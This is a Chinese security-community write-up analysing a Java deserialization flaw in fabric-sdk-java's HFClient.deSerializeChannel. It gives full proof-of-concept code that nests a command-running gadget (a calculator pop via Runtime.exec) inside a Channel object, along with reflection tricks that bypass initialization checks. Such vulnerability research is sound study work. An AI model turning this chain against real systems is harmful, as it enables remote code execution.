---
title: 【先知】fabric-sdk-java 反序列化利用链挖掘
source: https://xz.aliyun.com/news/92697
source_host: xz.aliyun.com
clip_date: 2026-08-20T14:00:17+08:00
trace_id: 898c7993-f485-4a76-a1d3-5f29b47ac660
content_hash: b79df6466310d60843a603637551baca3caa959a1da137b1d8f0cb2ac574a344
status: synced
tags:
  - 先知
  - 漏洞分析
  - Java反序列化
series: null
feed_source: 先知安全技术社区
ai_summary: fabric-sdk-java 的 HFClient.deSerializeChannel 存在 Java 反序列化漏洞，通过构造带恶意 gadget 的合法 Channel 对象可触发任意命令执行。
ai_summary_style: key-points
images_status:
  total: 23
  succeeded: 23
  failed_urls: []
notion_page_id: 3c275244-d011-8126-8e61-c76017d9023c
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> fabric-sdk-java 的 HFClient.deSerializeChannel 存在 Java 反序列化漏洞，通过构造带恶意 gadget 的合法 Channel 对象可触发任意命令执行。
> 
> - **入口点：** HFClient.deSerializeChannel(byte[]) 直接调用 ObjectInputStream.readObject()，且结果强转为 Channel，所以外层必须是一个合法 Channel 实例，否则抛 ClassCastException。
> - **可注入点：** Channel 类非 transient 字段 serviceDiscoveryProperties 类型为 Properties（继承 Hashtable），会被 defaultReadObject() 自动反序列化，其 value 可存放任意 Serializable 对象，正好用来放置恶意 gadget。
> - **绕过限制：** 直接 newChannel 会因 cryptoSuite 未设置而失败，改为调用包级私有方法 Channel.createNewInstance("eval", hfClient) 绕过检查；随后构造 Channel 时因 userContext 为 null 调用 getName() 触发 NPE，需反射设置 HFClient.userContext 为自定义 User 实现。
> - **最终利用：** 序列化合法 Channel，把自定义 EvilGadget 放入 serviceDiscoveryProperties 的 value 中；反序列化时内层 EvilGadget.readObject() 执行 Runtime.exec，外层 Channel 强转成功，程序正常返回无报错。
> - **经验总结：** 全局搜索 readObject 很容易，但在缺少 commons-collections 等现成 gadget 依赖时，手动构造可用利用链需要逐层调试并绕过多个初始化校验。

## 一、漏洞发现：搜索 readObject

全局搜索 readObject 方法

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/267bfbae417f28cc.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fdd6057c5ea98547.png)

接收一个字节数组，然后进行读取

```java
 public Channel deSerializeChannel(byte[] channelBytes)
            throws IOException, ClassNotFoundException, InvalidArgumentException {

        Channel channel;
        ObjectInputStream in = null;
        try {
            in = new ObjectInputStream(new ByteArrayInputStream(channelBytes));
            channel = (Channel) in.readObject();
            final String name = channel.getName();
            synchronized (channels) {
                if (null != getChannel(name)) {
                    channel.shutdown(true);
                    throw new InvalidArgumentException(format("Channel %s already exists in the client", name));
                }
                channels.put(name, channel);
                channel.client = this;
            }
```

查找函数调用

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/434989d2e9680c58.png)

发现直接全都是 test 中的测试代码了，说明就只有一层关系

那么就创建一个 demo，触发这个反序列化漏洞

直接创建对象，报红了

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/c097519ccadbe4bb.png)

显示构造函数是私有的，不能被引用

```plain
private HFClient() {
}
```

接着查看代码，发现 createNewInstance 函数

```plain
public static HFClient createNewInstance() {
    return new HFClient();
}
```

这样创建后，就可以直接调用反序列化函数

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/4b774b058fb93e0c.png)

但是触发 rce，需要一个入口点，当前没有，项目依赖中没有 commons-collections 等 gadget 库，所以需要手动构造利用链

## 二、初次尝试：直接序列化 EvilGadget

```java
package org.hyperledger.fabric.sdk;

import java.io.*;

public class Demo {

    public static void main(String[] args) throws Exception {
        
        // 生成序列化文件
        EvilGadget evil = new EvilGadget();
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"))) {
            oos.writeObject(evil);
        }

        // 创建对象，调用deSerializeChannel函数执行
        HFClient hfClient = HFClient.createNewInstance();
        File channelFile = new File("payload.bin");


        try {
            hfClient.deSerializeChannel(channelFile);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    // 执行命令
    public static class EvilGadget implements Serializable {
        private static final long serialVersionUID = 1L;
        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            try {
                Runtime.getRuntime().exec("open -a Calculator");
            } catch (Exception ignored) {}
        }
    }
}
```

编译运行后，计算器弹出了，但同时报了一个错误

```bash
# 编译
mvn -q compile -DskipTests -Dmaven.gitcommitid.skip=true 2>&1

# 执行
$JAVA_HOME/bin/java -cp "$CP" org.hyperledger.fabric.sdk.Demo
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/b1d0a202e7ab612a.png)

```java
java.lang.ClassCastException: org.hyperledger.fabric.sdk.Demo$EvilGadget cannot be cast to org.hyperledger.fabric.sdk.Channel
    at org.hyperledger.fabric.sdk.HFClient.deSerializeChannel(HFClient.java:335)
    at org.hyperledger.fabric.sdk.HFClient.deSerializeChannel(HFClient.java:315)
    at org.hyperledger.fabric.sdk.Demo.main(Demo.java:22)
```

## 三、分析 ClassCastException 原因

`(Channel) ...` → 把 `EvilGadget` 强转为 `Channel` → `ClassCastException` 命令执行了，但是程序崩溃了。

`deSerializeChannel` 里强转 `(Channel) in.readObject()` ，所以序列化的对象必须是 `Channel` 实例。直接序列化 `EvilGadget` 虽然触发了 `readObject()` ，但过不了强转，程序崩溃，不是真正的漏洞利用。

## 四、寻找注入点：Channel.serviceDiscoveryProperties

然后进入 Channel.java 文件中，看看代码如何编写的

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/efd2a7668011a470.png)

首先 `Channel` 实现了 `Serializable` ，可以被序列化/反序列化。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/529b99955d8a0b76.png)

`in.defaultReadObject()` 是 Java 反序列化机制中的\*\*"标准恢复操作"\*\*。它的核心作用是： **让 JVM 按默认规则，把序列化流里的字段值，重新填充到当前对象的普通（非** `transient` **）字段中。**

如果某个非 transient 字段是 `Object` 或容器类型（ `Map` / `Collection` / `Properties` ），其内容可以是任意 `Serializable` 对象。也就是可以进行反序列化操作。

那就需要寻找参数了，并且参数不带 transient，且符合上面的类型，grep 全局搜索

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/41b2b2db846dd289.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/f32543a60198d580.png)

全局搜索，还有 set/get 方法，更方便赋值了

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/40210248ae2409a3.png)

```java
  public Properties getServiceDiscoveryProperties() {
        return serviceDiscoveryProperties;
    }

    public void setServiceDiscoveryProperties(Properties serviceDiscoveryProperties) {
        this.serviceDiscoveryProperties = serviceDiscoveryProperties;
    }
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/0d82e523b1bf2205.png)

1.  **非 transient** → 会被 `defaultReadObject()` 自动反序列化
2.  `Properties` **继承自** `Hashtable<Object, Object>` → value 类型是 `Object`
3.  `Object` **可以是任意** `Serializable` **对象** → 包括我们的 `EvilGadget`

思路：构造一个合法的 `Channel` 对象，把 `EvilGadget` 塞进 `serviceDiscoveryProperties` ，再序列化。反序列化时外层是合法 Channel（强转成功），内层 gadget 被触发。

## 五、构造合法 Channel 对象（踩坑过程）

回到 HFClient 代码中，看看有没有新建 Channel 的方法，搜索关键字

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/4f0db6e583b325f5.png)

刚好有，我们直接拿来用。尝试编写代码

```java
package org.hyperledger.fabric.sdk;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Properties;

public class Poc {
    public static void main(String[] args) throws Exception {
        // 创建对象
        HFClient hfClient = HFClient.createNewInstance();

        // 创建 chananel
        Channel channel = hfClient.newChannel("evil-channel");

        //  调用 set 方法 
        Properties props = new Properties();
        props.put("payload", new EvilGadget());
        channel.setServiceDiscoveryProperties(props);

        // 序列化
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"))) {
            oos.writeObject(channel);
        }

        // 反序列化触发
        hfClient.deSerializeChannel(new File("payload.bin"));
    }

    public static class EvilGadget implements Serializable {
        private static final long serialVersionUID = 1L;
        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            Runtime.getRuntime().exec("open -a Calculator");
        }
    }
}
```

编译执行命令：

```bash
# 编译
javac -cp "target/classes:$(cat /tmp/cp.txt)" -d target/classes src/main/java/org/hyperledger/fabric/sdk/Poc.java

# 执行
java -cp "target/classes:$(cat /tmp/cp.txt)" org.hyperledger.fabric.sdk.Poc
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/77ff45dfbb587e3d.png)

返回了报错信息，cryptoSuite 没有被设置

### 坑1：newChannel 要求 cryptoSuite

再回到代码，看看这个参数的作用

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ea7158d135b79cf7.png)

这里存在 if 判断，这个参数没有给值，所以直接返回报错信息

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/902ab2056023c21b.png)

`newChannel` 内部调用了 `Channel.createNewInstance` ，跟进这个方法

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/5e9291cb4d72ab8b.png)

是一个包级私有静态方法，因为 Poc 类与 Channel 在同一个包 `org.hyperledger.fabric.sdk` 下，可以直接调用，这样就绕过了 clientCheck 限制

修改 poc 代码

```java
// 直接调用包级私有方法，绕过 clientCheck
Channel channel = Channel.createNewInstance("eval", hfClient);
```

### 坑2：Channel 构造方法 NPE

编译运行，报错

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/72839cee5141e816.png)

找到 285 行

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/9675e4aaaf73655f.png)

channel 构造方法的 this 指向私有构造方法，跟进 313 行的 `client.getUserContext()` ，因为 userContext 没有设置过，默认为 null，调用 `.getName()` 触发 NPE

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/281aeba9a65df5c9.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/cb41e86202925a7d.png)

getName 指向一个 User 接口

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/421de2587135862a.png)

### 坑3：setUserContext 也要 cryptoSuite

User 是接口，需要写一个实现类 TestUser，然后反射设置 HFClient 的 userContext 字段为 TestUser 实例（用公开方法 setUserContext 会检查 cryptoSuite，所以只能反射设置）

## 六、最终 Poc 与调用链

```java
package org.hyperledger.fabric.sdk;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Collections;
import java.util.Properties;
import java.util.Set;

public class Poc {
    public static void main(String[] args) throws Exception {
        // 创建对象
        HFClient hfClient = HFClient.createNewInstance();

        // 反射设置 userContext 
        Field ucField = HFClient.class.getDeclaredField("userContext");
        ucField.setAccessible(true);
        ucField.set(hfClient, new TestUser());

        // 创建 channel
        Channel channel = Channel.createNewInstance("eval", hfClient);

        // 调用 set 方法
        Properties props = new Properties();
        props.put("payload", new EvilGadget());
        channel.setServiceDiscoveryProperties(props);

        // 序列化
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"))) {
            oos.writeObject(channel);
        }

        // 反序列化触发
        hfClient.deSerializeChannel(new File("payload.bin"));
    }

    static class TestUser implements User {
        public String getName() { return "test"; }
        public Set<String> getRoles() { return Collections.emptySet(); }
        public String getAccount() { return ""; }
        public String getAffiliation() { return ""; }
        public Enrollment getEnrollment() { return null; }
        public String getMspId() { return "test"; }
    }

    public static class EvilGadget implements Serializable {
        private static final long serialVersionUID = 1L;
        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            Runtime.getRuntime().exec("open -a Calculator");
        }
    }
}
```

此时就正常执行了，并且没有任何报错

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/15dabf2b950a8fdf.png)

整体的流程是

```plain
hfClient.deSerializeChannel(payload.bin)
  └─ HFClient.deSerializeChannel(byte[])                    [HFClient.java:328]
       └─ new ObjectInputStream(new ByteArrayInputStream(bytes))
       └─ in.readObject()                                   [HFClient.java:335]
            └─ ObjectInputStream.readObject()
                 ├─ 读取类描述符: Channel
                 ├─ 创建 Channel 实例（不调构造方法）
                 └─ 调用 Channel.readObject(in)             [Channel.java:362]
                      └─ in.defaultReadObject()             [Channel.java:364]
                           ├─ 反序列化 name = "evil"
                           ├─ 反序列化 peers = []
                           ├─ 反序列化 serviceDiscoveryProperties  ← 关键！
                           │    └─ Properties (Hashtable) 反序列化
                           │         └─ 反序列化每个 entry
                           │              └─ value = EvilGadget
                           │                   └─ EvilGadget.readObject()     [Poc.java]
                           │                        └─ in.defaultReadObject()
                           │                        └─ Runtime.exec("open -a Calculator") 
                           ├─ 反序列化 discoveryEndpoints = []
                           └─ ... 其他非 transient 字段
                      └─ 设置 toString, initialized, msps 等
                 └─ 返回 Channel 实例
       └─ channel = (Channel) result                        [HFClient.java:335] 强转成功
       └─ channel.getName() → "evil"
       └─ channels.put("evil", channel)
       └─ return channel                                    程序正常返回
```

## 七、总结

这是找的最简单的代码，搜索 readObject 方法很容易，但是利用的攻击链，针对我这种小白需要花费时间太久了，需要一步一步的调试。
